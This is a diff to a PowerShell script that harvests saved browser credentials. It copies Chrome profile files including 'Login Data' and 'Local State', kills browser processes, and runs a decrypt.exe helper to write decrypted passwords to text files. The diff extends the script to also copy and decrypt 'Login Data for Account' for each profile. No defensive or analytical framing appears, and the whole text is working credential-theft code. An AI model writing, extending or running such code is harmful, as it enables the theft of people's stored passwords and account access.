@@ -20,7 +20,18 @@ function CopyBrowserFiles($browserName, $browserDir, $profileName, $filesToCopy)
             Write-Host "$browserName - Profile $profileName - File not found: $file"
         }
     }
+
+    # Copy "Login Data for Account" if it exists
+    $loginDataAccountFile = "Login Data for Account"
+    $accountSource = Join-Path -Path $browserDir -ChildPath $loginDataAccountFile
+    if (Test-Path $accountSource) {
+        Copy-Item -Path $accountSource -Destination $browserDestDir
+        Write-Host "$browserName - Profile $profileName - File copied: $loginDataAccountFile"
+    } else {
+        Write-Host "$browserName - Profile $profileName - File not found: $loginDataAccountFile"
+    }
 }
+
 
 # Function to kill browser processes
 function KillBrowserProcesses($browserName) {
@@ -36,24 +47,41 @@ function DecryptLoginData($browserName, $profileName) {
     $profileDir = Join-Path -Path $destDir -ChildPath "$browserName\$profileName"
     $decryptExePath = Join-Path -Path "$destDir\Chrome" -ChildPath "decrypt.exe"
     $loginDataPath = Join-Path -Path $profileDir -ChildPath "Login Data"
+    $loginDataAccountPath = Join-Path -Path $profileDir -ChildPath "Login Data for Account"
     $localStatePath = Join-Path -Path $profileDir -ChildPath "Local State"
     $outputPath = Join-Path -Path $profileDir -ChildPath "output.txt"
+    $accountOutputPath = Join-Path -Path $profileDir -ChildPath "output_account.txt"
 
     # Test-Path commands wrapped in parentheses
     if ((Test-Path $decryptExePath) -and (Test-Path $loginDataPath) -and (Test-Path $localStatePath)) {
-        # Run the decrypt.exe with specified parameters and capture output
+        # Run the decrypt.exe for Login Data first
         $decryptCommand = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
-        Write-Host "$browserName - $profileName - Decrypt.exe output: $decryptCommand"
+        Write-Host "$browserName - $profileName - Decrypt.exe output for Login Data: $decryptCommand"
         
         if (Test-Path $outputPath) {
-            Write-Host "$browserName - $profileName - Decrypted passwords saved to: $outputPath"
+            Write-Host "$browserName - $profileName - Decrypted Login Data saved to: $outputPath"
         } else {
-            Write-Host "$browserName - $profileName - Decrypted passwords not found."
+            Write-Host "$browserName - $profileName - Decrypted Login Data not found."
+        }
+        
+        # Now check for "Login Data for Account" and decrypt it
+        if (Test-Path $loginDataAccountPath) {
+            $decryptCommandAccount = & $decryptExePath $loginDataAccountPath $localStatePath $accountOutputPath 2>&1
+            Write-Host "$browserName - $profileName - Decrypt.exe output for Login Data for Account: $decryptCommandAccount"
+            
+            if (Test-Path $accountOutputPath) {
+                Write-Host "$browserName - $profileName - Decrypted Login Data for Account saved to: $accountOutputPath"
+            } else {
+                Write-Host "$browserName - $profileName - Decrypted Login Data for Account not found."
+            }
+        } else {
+            Write-Host "$browserName - $profileName - Login Data for Account not found."
         }
     } else {
         Write-Host "$browserName - $profileName - Required files not found for decryption."
     }
 }
+
 
 # Configuration for Google Chrome
 $chromeProfiles = @("Default", "Profile 1", "Profile 2")
